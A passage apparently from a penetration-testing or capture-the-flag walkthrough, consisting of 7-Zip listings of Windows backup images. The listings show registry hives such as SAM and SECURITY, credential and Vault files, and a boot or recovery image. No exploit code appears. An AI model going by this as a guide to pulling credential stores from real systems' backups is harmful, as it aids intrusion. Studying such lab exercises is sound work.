2025-02-16 19:47:38 D.HS.                            systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/INetCookies
2025-02-16 19:47:38 D.HS.                            systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/INetHistory
2025-02-16 19:47:38 D....                            systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/Temp
2025-02-16 10:48:12 D..S.                            systemprofile/AppData/LocalLow/Microsoft
2025-02-16 10:48:12 D..S.                            systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache
2025-02-16 10:48:59 D..S.                            systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content
2025-02-16 10:48:59 D..S.                            systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
2025-02-16 10:48:44 D..S.                            systemprofile/AppData/Roaming/Microsoft
2025-02-16 19:47:55 D....                            systemprofile/AppData/Roaming/Microsoft/Internet Explorer
2025-02-16 19:47:44 D..S.                            systemprofile/AppData/Roaming/Microsoft/SystemCertificates
2025-02-16 10:48:44 D....                            systemprofile/AppData/Roaming/Microsoft/Vault
2025-02-16 10:48:11 D....                            systemprofile/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch
2025-02-16 19:47:44 D..S.                            systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My
2025-02-16 19:47:44 D..S.                            systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/Certificates
2025-02-16 19:47:44 D..S.                            systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/CRLs
2025-02-16 19:47:44 D..S.                            systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/CTLs
2021-05-08 08:06:52 ..HSA            0            0  ELAM.LOG2
2021-05-08 08:06:51 ..HSA            0            0  SECURITY.LOG2
2021-05-08 08:06:51 ..HSA            0            0  SOFTWARE.LOG1
2021-05-08 08:06:51 ..HSA            0            0  SYSTEM.LOG1
2021-05-08 08:06:51 ..HSA            0            0  SYSTEM.LOG2
2025-02-16 19:47:38 ....A            0            0  RegBack/DEFAULT
2025-02-16 19:47:38 ....A            0            0  RegBack/SAM
2025-02-16 19:47:38 ....A            0            0  RegBack/SECURITY
2025-02-16 19:47:38 ....A            0            0  RegBack/SOFTWARE
2025-02-16 19:47:38 ....A            0            0  RegBack/SYSTEM
2025-02-16 10:48:59 ...SA            0            0  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/77EC63BDA74BD0D0E0426DC8F8008506
2025-02-16 19:47:44 ...SA            0            0  systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/AppContainerUserCertRead
2025-02-16 11:16:08 ....A        32768         4888  BBI
2021-05-08 08:06:52 ..HSA        40960         7329  BBI.LOG1
2021-05-08 08:06:52 ..HSA        40960         7452  BBI.LOG2
2021-05-08 08:06:52 ..HSA        65536         1462  BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2021-05-08 08:06:52 ..HSA       524288         4311  BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 19:47:13 ....A        28672         5340  BCD-Template
2021-05-08 08:06:52 ..HSA       524288         4268  BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 19:47:43 ..HSA       524288         4268  COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 19:47:38 ..HSA       524288         4268  DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 19:47:55 ..HSA       524288         4268  ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 19:47:38 ..HSA       524288         4268  TxR/{c76cbc7f-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 19:47:13 ..HSA        28672         5365  BCD-Template.LOG
2021-05-08 08:06:51 ..HSA       589824       157523  COMPONENTS.LOG1
2021-05-08 08:06:51 ..HSA     11575296      2182415  COMPONENTS.LOG2
2025-02-16 11:16:28 ..HSA        65536         1398  COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 11:16:28 ..HSA       524288        23651  COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 11:16:08 ....A       262144        51307  DEFAULT
2021-05-08 08:06:51 ..HSA        98304        25734  DEFAULT.LOG1
2021-05-08 08:06:51 ..HSA        90112        13951  DEFAULT.LOG2
2025-02-16 11:09:18 ....A      3473408       660661  DRIVERS
2021-05-08 08:06:51 ..HSA       475136       118269  DRIVERS.LOG1
2021-05-08 08:06:51 ..HSA       208896        53640  DRIVERS.LOG2
2025-02-16 11:06:24 ..HSA        65536         1388  DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 11:06:24 ..HSA       524288         4784  DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 10:55:40 ....A        32768         6555  ELAM
2021-05-08 08:06:52 ..HSA        32768         6584  ELAM.LOG1
2025-02-16 19:47:55 ..HSA        65536         1372  ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 19:47:55 ..HSA       524288         4309  ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 11:16:22 ....A          120          120  netlogon.ftl
2025-02-16 11:16:08 ....A        65536        14320  SAM
2021-05-08 08:06:51 ..HSA        65536         9960  SAM.LOG1
2021-05-08 08:06:51 ..HSA        49152         9502  SAM.LOG2
2025-02-16 11:16:08 ....A        32768         7479  SECURITY
2021-05-08 08:06:51 ..HSA        68608         6717  SECURITY.LOG1
2025-02-16 11:18:47 ....A     64225280     18081618  COMPONENTS
2021-05-08 08:06:51 ..HSA      5996544       979171  SOFTWARE.LOG2
2025-02-16 11:16:08 ....A     17039360      3632062  SYSTEM
2025-02-16 11:06:47 ....A        65552          601  systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx
2025-02-16 11:06:47 ....A            4            4  systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock
2025-02-16 11:16:29 ....A            4            4  systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock
2025-02-16 10:52:27 ....A            4            4  systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock
2025-02-16 11:10:47 ....A            4            4  systemprofile/AppData/Local/D3DSCache/f9156d1136660b11/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock
2025-02-16 11:06:47 ....A          976          373  systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val
2025-02-16 11:16:29 ....A        65552          601  systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx
2025-02-16 11:16:29 ....A          976          369  systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val
2025-02-16 10:52:27 ....A        65552          601  systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx
2025-02-16 10:52:27 ....A          960          363  systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val
2025-02-16 11:10:47 ....A        65552          601  systemprofile/AppData/Local/D3DSCache/f9156d1136660b11/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx
2025-02-16 11:10:47 ....A          960          365  systemprofile/AppData/Local/D3DSCache/f9156d1136660b11/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val
2025-02-16 10:48:34 ..HSA        11136        11136  systemprofile/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
2025-02-16 10:48:44 ....A          180          180  systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/1D4350A3-330D-4AF9-B3FF-A927A45998AC.vsch
2025-02-16 10:48:44 ....A          436          436  systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/Policy.vpol
2025-02-16 10:49:09 ....A       424337       125879  systemprofile/AppData/Local/Microsoft/Windows/1033/StructuredQuerySchema.bin
2025-02-16 10:49:09 ....A        16384         1003  systemprofile/AppData/Local/Microsoft/Windows/Caches/cversions.3.db
2025-02-16 10:49:10 ....A       424376       125907  systemprofile/AppData/Local/Microsoft/Windows/Caches/{17A6A947-B905-4D30-88C9-B63C603DA134}.3.ver0x0000000000000001.db
2025-02-16 10:48:12 ...SA         4761         4761  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/57C8EDB95DF3F0AD4EE2DC2B8CFD4157
2025-02-16 10:48:27 ...SA          471          471  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/7423F88C7F265F0DEFC08EA88C3BDE45_AA1E8580D4EBC816148CE81268683776
2025-02-16 10:50:01 ...SA         7796         7796  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/FB0D848F74F70BB2EAA93746D24D9749
2025-02-16 10:48:59 ...SA          340          340  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/57C8EDB95DF3F0AD4EE2DC2B8CFD4157
2025-02-16 10:50:01 ...SA          404          404  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/7423F88C7F265F0DEFC08EA88C3BDE45_AA1E8580D4EBC816148CE81268683776
2025-02-16 10:52:29 ...SA          290          290  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/77EC63BDA74BD0D0E0426DC8F8008506
2025-02-16 10:52:29 ...SA          330          330  systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/FB0D848F74F70BB2EAA93746D24D9749
2025-02-16 10:57:52 ....A         2272          946  systemprofile/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Microsoft Edge.lnk
2025-02-16 11:06:24 ..HSA      5242880       665376  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.0.regtrans-ms
2025-02-16 11:06:24 ..HSA      5242880       583966  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.1.regtrans-ms
2025-02-16 11:06:24 ..HSA      5242880       631119  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.2.regtrans-ms
2025-02-16 11:06:24 ..HSA      5242880       699727  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.3.regtrans-ms
2025-02-16 11:06:24 ..HSA      5242880       644147  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.4.regtrans-ms
2025-02-16 11:06:24 ..HSA      5242880       565625  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.5.regtrans-ms
2025-02-16 11:16:08 ..HSA      5242880       558369  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.6.regtrans-ms
2025-02-16 11:16:08 ..HSA        65536         1621  TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.blf
2025-02-16 11:16:08 ..HSA        65536         1308  TxR/{c76cbc7f-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 11:16:08 ..HSA       524288        22718  TxR/{c76cbc7f-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 11:16:08 ....A     81264640     19897693  SOFTWARE
------------------- ----- ------------ ------------  ------------------------
2025-02-16 19:47:55          229314097     50667415  86 files, 43 folders

Warnings: 1

```

`AWSJPWK0222-03.wim` looks like some kind of recovery disk:

```

oxdf@hacky$ 7z l AWSJPWK0222-03.wim

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 32065850 bytes (31 MiB)

Listing archive: AWSJPWK0222-03.wim
--
Path = AWSJPWK0222-03.wim
Type = wim
Physical Size = 32065850
Size = 68844676
Packed Size = 32037451
Method = XPress:15
Cluster Size = 32768
Created = 2025-02-16 11:23:47.8540971
Modified = 2025-02-16 11:23:47.8540971
Comment = <WIM><TOTALBYTES>32065010</TOTALBYTES><IMAGE INDEX="1"><DIRCOUNT>125</DIRCOUNT><FILECOUNT>295</FILECOUNT><TOTALBYTES>72014980</TOTALBYTES><HARDLINKBYTES>0</HARDLINKBYTES><CREATIONTIME><HIGHPART>0x01DB8065</HIGHPART><LOWPART>0x3F3C76AB</LOWPART></CREATIONTIME><LASTMODIFICATIONTIME><HIGHPART>0x01DB8065</HIGHPART><LOWPART>0x3F3C76AB</LOWPART></LASTMODIFICATIONTIME><WIMBOOT>0</WIMBOOT><NAME>Backup03</NAME></IMAGE></WIM>
Version = 1.13
Multivolume = -
Volume = 1
Volumes = 1
Images = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-05-08 08:20:24 D....                            DVD
2025-02-16 11:05:48 D....                            DVD_EX
2025-02-16 11:05:50 D....                            EFI
2025-02-16 11:05:48 D....                            EFI_EX
2025-02-16 11:05:50 D....                            Fonts
2025-02-16 11:05:50 D....                            Fonts_EX
2021-05-08 08:20:24 D....                            Misc
2025-02-16 11:05:48 D....                            PCAT
2021-05-08 09:35:26 D....                            Resources
2025-02-16 11:05:50 D....                            DVD/EFI
2025-02-16 11:05:50 D....                            DVD/PCAT
2025-02-16 11:05:50 D....                            DVD/EFI/en-US
2025-02-16 11:05:50 D....                            DVD/PCAT/en-US
2025-02-16 11:05:48 D....                            DVD_EX/EFI
2025-02-16 11:05:50 D....                            DVD_EX/EFI/en-US
2025-02-16 11:05:50 D....                            EFI/bg-BG
2025-02-16 11:05:50 D....                            EFI/cs-CZ
2025-02-16 11:05:50 D....                            EFI/da-DK
2025-02-16 11:05:50 D....                            EFI/de-DE
2025-02-16 11:05:50 D....                            EFI/el-GR
2025-02-16 11:05:50 D....                            EFI/en-GB
2025-02-16 11:05:50 D....                            EFI/en-US
2025-02-16 11:05:50 D....                            EFI/es-ES
2025-02-16 11:05:50 D....                            EFI/es-MX
2025-02-16 11:05:50 D....                            EFI/et-EE
2025-02-16 11:05:50 D....                            EFI/fi-FI
2025-02-16 11:05:50 D....                            EFI/fr-CA
2025-02-16 11:05:50 D....                            EFI/fr-FR
2025-02-16 11:05:50 D....                            EFI/hr-HR
2025-02-16 11:05:50 D....                            EFI/hu-HU
2025-02-16 11:05:50 D....                            EFI/it-IT
2025-02-16 11:05:50 D....                            EFI/ja-JP
2025-02-16 11:05:50 D....                            EFI/ko-KR
2025-02-16 11:05:50 D....                            EFI/lt-LT
2025-02-16 11:05:50 D....                            EFI/lv-LV
2025-02-16 11:05:50 D....                            EFI/nb-NO
2025-02-16 11:05:50 D....                            EFI/nl-NL
2025-02-16 11:05:50 D....                            EFI/pl-PL
2025-02-16 11:05:50 D....                            EFI/pt-BR
2025-02-16 11:05:50 D....                            EFI/pt-PT
2021-05-08 08:20:26 D....                            EFI/qps-ploc
2025-02-16 11:05:50 D....                            EFI/ro-RO
2025-02-16 11:05:50 D....                            EFI/ru-RU
2025-02-16 11:05:50 D....                            EFI/sk-SK
2025-02-16 11:05:50 D....                            EFI/sl-SI
2025-02-16 11:05:50 D....                            EFI/sr-Latn-RS
2025-02-16 11:05:50 D....                            EFI/sv-SE
2025-02-16 11:05:50 D....                            EFI/tr-TR
2025-02-16 11:05:50 D....                            EFI/uk-UA
2025-02-16 11:05:50 D....                            EFI/zh-CN
2025-02-16 11:05:50 D....                            EFI/zh-TW
2025-02-16 11:05:50 D....                            EFI_EX/bg-BG
2025-02-16 11:05:50 D....                            EFI_EX/cs-CZ
2025-02-16 11:05:50 D....                            EFI_EX/da-DK
2025-02-16 11:05:50 D....                            EFI_EX/de-DE
2025-02-16 11:05:50 D....                            EFI_EX/el-GR
2025-02-16 11:05:50 D....                            EFI_EX/en-GB
2025-02-16 11:05:50 D....                            EFI_EX/en-US
2025-02-16 11:05:50 D....                            EFI_EX/es-ES
2025-02-16 11:05:50 D....                            EFI_EX/es-MX
2025-02-16 11:05:50 D....                            EFI_EX/et-EE
2025-02-16 11:05:50 D....                            EFI_EX/fi-FI
2025-02-16 11:05:50 D....                            EFI_EX/fr-CA
2025-02-16 11:05:50 D....                            EFI_EX/fr-FR
2025-02-16 11:05:50 D....                            EFI_EX/hr-HR
2025-02-16 11:05:50 D....                            EFI_EX/hu-HU
2025-02-16 11:05:50 D....                            EFI_EX/it-IT
2025-02-16 11:05:50 D....                            EFI_EX/ja-JP
2025-02-16 11:05:50 D....                            EFI_EX/ko-KR
2025-02-16 11:05:50 D....                            EFI_EX/lt-LT
2025-02-16 11:05:50 D....                            EFI_EX/lv-LV
2025-02-16 11:05:50 D....                            EFI_EX/nb-NO
2025-02-16 11:05:50 D....                            EFI_EX/nl-NL
2025-02-16 11:05:50 D....                            EFI_EX/pl-PL
2025-02-16 11:05:50 D....                            EFI_EX/pt-BR
2025-02-16 11:05:50 D....                            EFI_EX/pt-PT
2025-02-16 11:05:50 D....                            EFI_EX/ro-RO
2025-02-16 11:05:50 D....                            EFI_EX/ru-RU
2025-02-16 11:05:50 D....                            EFI_EX/sk-SK
2025-02-16 11:05:50 D....                            EFI_EX/sl-SI
2025-02-16 11:05:50 D....                            EFI_EX/sr-Latn-RS
2025-02-16 11:05:50 D....                            EFI_EX/sv-SE
2025-02-16 11:05:50 D....                            EFI_EX/tr-TR
2025-02-16 11:05:50 D....                            EFI_EX/uk-UA
2025-02-16 11:05:50 D....                            EFI_EX/zh-CN
2025-02-16 11:05:50 D....                            EFI_EX/zh-TW
2025-02-16 11:05:48 D....                            Misc/PCAT
2025-02-16 11:05:50 D....                            PCAT/bg-BG
2025-02-16 11:05:50 D....                            PCAT/cs-CZ
2025-02-16 11:05:50 D....                            PCAT/da-DK
2025-02-16 11:05:50 D....                            PCAT/de-DE
2025-02-16 11:05:50 D....                            PCAT/el-GR
2025-02-16 11:05:50 D....                            PCAT/en-GB
2025-02-16 11:05:50 D....                            PCAT/en-US
2025-02-16 11:05:50 D....                            PCAT/es-ES
2025-02-16 11:05:50 D....                            PCAT/es-MX
2025-02-16 11:05:50 D....                            PCAT/et-EE
2025-02-16 11:05:50 D....                            PCAT/fi-FI
2025-02-16 11:05:50 D....                            PCAT/fr-CA
2025-02-16 11:05:50 D....                            PCAT/fr-FR
2025-02-16 11:05:50 D....                            PCAT/hr-HR
2025-02-16 11:05:50 D....                            PCAT/hu-HU
2025-02-16 11:05:50 D....                            PCAT/it-IT
2025-02-16 11:05:50 D....                            PCAT/ja-JP
2025-02-16 11:05:50 D....                            PCAT/ko-KR
2025-02-16 11:05:50 D....                            PCAT/lt-LT
2025-02-16 11:05:50 D....                            PCAT/lv-LV
2025-02-16 11:05:50 D....                            PCAT/nb-NO
2025-02-16 11:05:50 D....                            PCAT/nl-NL
2025-02-16 11:05:50 D....                            PCAT/pl-PL
2025-02-16 11:05:50 D....                            PCAT/pt-BR
2025-02-16 11:05:50 D....                            PCAT/pt-PT
2025-02-16 11:05:50 D....                            PCAT/qps-ploc
2025-02-16 11:05:50 D....                            PCAT/qps-plocm
2025-02-16 11:05:50 D....                            PCAT/ro-RO
2025-02-16 11:05:50 D....                            PCAT/ru-RU
2025-02-16 11:05:50 D....                            PCAT/sk-SK
2025-02-16 11:05:50 D....                            PCAT/sl-SI
2025-02-16 11:05:50 D....                            PCAT/sr-Latn-RS
2025-02-16 11:05:50 D....                            PCAT/sv-SE
2025-02-16 11:05:50 D....                            PCAT/tr-TR
2025-02-16 11:05:50 D....                            PCAT/uk-UA
2025-02-16 11:05:50 D....                            PCAT/zh-CN
2025-02-16 11:05:50 D....                            PCAT/zh-TW
2021-05-08 09:35:26 D....                            Resources/en-US
2021-05-08 08:14:21 ....A           91           91  BootDebuggerFiles.ini
2025-02-16 11:02:00 ....A        16384         3503  DVD/EFI/BCD
2021-05-08 08:16:00 ....A      3170304       164531  DVD/EFI/boot.sdi
2021-05-08 08:16:00 ....A      3170304       164531  DVD/PCAT/boot.sdi
2025-02-16 11:02:02 ....A      1474560       539941  DVD/EFI/en-US/efisys.bin
2025-02-16 11:02:00 ....A        16384         3340  DVD/PCAT/BCD
2025-02-16 11:02:02 ....A      1474560       539918  DVD/EFI/en-US/efisys_noprompt.bin
2025-02-16 11:02:02 ....A         4096         1752  DVD/PCAT/etfsboot.com
2025-02-16 11:01:57 ....A         1024          537  DVD/PCAT/en-US/bootfix.bin
2025-02-16 11:02:02 ....A      1474560       617657  DVD_EX/EFI/en-US/efisys_EX.bin
2025-02-16 11:00:54 ....A        11030         7894  EFI/boot.stl
2025-02-16 11:02:02 ....A      1474560       617796  DVD_EX/EFI/en-US/efisys_noprompt_EX.bin
2025-02-16 11:00:54 ....A      2033656      1157503  EFI/bootmgfw.efi
2021-05-08 08:14:43 ....A        53576         8360  EFI/kdnet_uart16550.dll
2025-02-16 11:00:57 ....A        83424        27703  EFI/kdstub.dll
2025-02-16 11:00:54 ....A      2017288      1150729  EFI/bootmgr.efi
2021-05-08 08:14:43 ....A        65864        15527  EFI/kd_02_10df.dll
2021-05-08 08:14:43 ....A        61768        12930  EFI/kd_02_1137.dll
2021-05-08 08:14:43 ....A       270664       115260  EFI/kd_02_14e4.dll
2021-05-08 08:14:43 ....A       430416       148754  EFI/kd_02_10ec.dll
2021-05-08 08:14:43 ....A        82248        24980  EFI/kd_02_15b3.dll
2021-05-08 08:14:43 ....A        78136        20785  EFI/kd_02_1969.dll
2021-05-08 08:14:43 ....A        57680        10537  EFI/kd_02_1af4.dll
2021-05-08 08:14:43 ....A        65872        15504  EFI/kd_02_19a2.dll
2021-05-08 08:14:43 ....A        53584         8782  EFI/kd_07_1415.dll
2021-05-08 08:14:43 ....A       328008       146666  EFI/kd_02_8086.dll
2021-05-08 08:14:43 ....A        82248        27597  EFI/kd_0C_8086.dll
2025-02-16 11:00:54 ....A       162192        91750  EFI/SecureBootRecovery.efi
2021-05-08 08:14:21 ....A         9796         3736  EFI/winsipolicy.p7b
2025-02-16 11:01:07 ....A        82440        17377  EFI/bg-BG/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        82408        17370  EFI/bg-BG/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        81416        17162  EFI/cs-CZ/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81416        17160  EFI/cs-CZ/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12783  EFI/cs-CZ/memtest.efi.mui
2025-02-16 11:00:54 ....A      1808880      1043290  EFI/memtest.efi
2025-02-16 11:01:07 ....A        80392        16549  EFI/da-DK/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        80376        16555  EFI/da-DK/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12726  EFI/da-DK/memtest.efi.mui
2025-02-16 11:01:07 ....A        84472        17832  EFI/de-DE/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        84488        17820  EFI/de-DE/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45896        12801  EFI/de-DE/memtest.efi.mui
2025-02-16 11:01:07 ....A        85472        18603  EFI/el-GR/bootmgfw.efi.mui
2021-05-08 08:14:34 ....A        46408        13160  EFI/el-GR/memtest.efi.mui
2025-02-16 11:01:07 ....A        85480        18618  EFI/el-GR/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        78344        16094  EFI/en-GB/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        78320        16105  EFI/en-GB/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        78344        16101  EFI/en-US/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        78344        16095  EFI/en-US/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        44872        12471  EFI/en-US/memtest.efi.mui
2025-02-16 11:01:07 ....A        82400        17007  EFI/es-ES/bootmgfw.efi.mui
2021-05-08 08:14:34 ....A        45896        12824  EFI/es-ES/memtest.efi.mui
2025-02-16 11:01:07 ....A        82424        17027  EFI/es-ES/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        82400        16979  EFI/es-MX/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        82424        16995  EFI/es-MX/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        79328        16328  EFI/et-EE/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        79368        16344  EFI/et-EE/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        81416        16781  EFI/fi-FI/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81416        16773  EFI/fi-FI/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12757  EFI/fi-FI/memtest.efi.mui
2025-02-16 11:01:07 ....A        84448        17736  EFI/fr-CA/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        84472        17754  EFI/fr-CA/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        84488        17751  EFI/fr-FR/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        84488        17749  EFI/fr-FR/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45904        12805  EFI/fr-FR/memtest.efi.mui
2025-02-16 11:01:07 ....A        81416        17025  EFI/hr-HR/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81392        17034  EFI/hr-HR/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        84440        17951  EFI/hu-HU/bootmgfw.efi.mui
2021-05-08 08:14:34 ....A        45896        12854  EFI/hu-HU/memtest.efi.mui
2025-02-16 11:01:07 ....A        84464        17988  EFI/hu-HU/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        81928        16773  EFI/it-IT/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81912        16773  EFI/it-IT/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12701  EFI/it-IT/memtest.efi.mui
2025-02-16 11:01:07 ....A        70640        16292  EFI/ja-JP/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        70664        16298  EFI/ja-JP/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        42824        12470  EFI/ja-JP/memtest.efi.mui
2025-02-16 11:01:07 ....A        70152        16253  EFI/ko-KR/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        70128        16267  EFI/ko-KR/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        42824        12477  EFI/ko-KR/memtest.efi.mui
2025-02-16 11:01:07 ....A        80392        16894  EFI/lt-LT/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        80376        16890  EFI/lt-LT/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        80352        16680  EFI/lv-LV/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        79880        16491  EFI/nb-NO/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        80376        16702  EFI/lv-LV/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        79856        16498  EFI/nb-NO/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12732  EFI/nb-NO/memtest.efi.mui
2025-02-16 11:01:07 ....A        82400        17052  EFI/nl-NL/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        82440        17056  EFI/nl-NL/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12683  EFI/nl-NL/memtest.efi.mui
2025-02-16 11:01:07 ....A        82952        17449  EFI/pl-PL/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        82952        17446  EFI/pl-PL/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45896        12853  EFI/pl-PL/memtest.efi.mui
2025-02-16 11:01:07 ....A        81416        16748  EFI/pt-BR/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81400        16744  EFI/pt-BR/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45384        12720  EFI/pt-BR/memtest.efi.mui
2025-02-16 11:01:07 ....A        81400        16811  EFI/pt-PT/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81416        16809  EFI/pt-PT/bootmgr.efi.mui
2021-05-08 08:14:34 ....A        45904        12733  EFI/pt-PT/memtest.efi.mui
2021-05-08 08:14:34 ....A        54088        23751  EFI/qps-ploc/memtest.efi.mui
2025-02-16 11:01:07 ....A        80864        16853  EFI/ro-RO/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        80888        16869  EFI/ro-RO/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        81912        17472  EFI/ru-RU/bootmgfw.efi.mui
2021-05-08 08:14:34 ....A        44872        12886  EFI/ru-RU/memtest.efi.mui
2025-02-16 11:01:07 ....A        81904        17485  EFI/ru-RU/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        81888        17386  EFI/sk-SK/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        81928        17394  EFI/sk-SK/bootmgr.efi.mui
2025-02-16 11:01:07 ....A        80888        16733  EFI/sl-SI/bootmgfw.efi.mui
2025-02-16 11:01:07 ....A        80888        16731  EFI/sl-SI/bootmgr.efi.mui
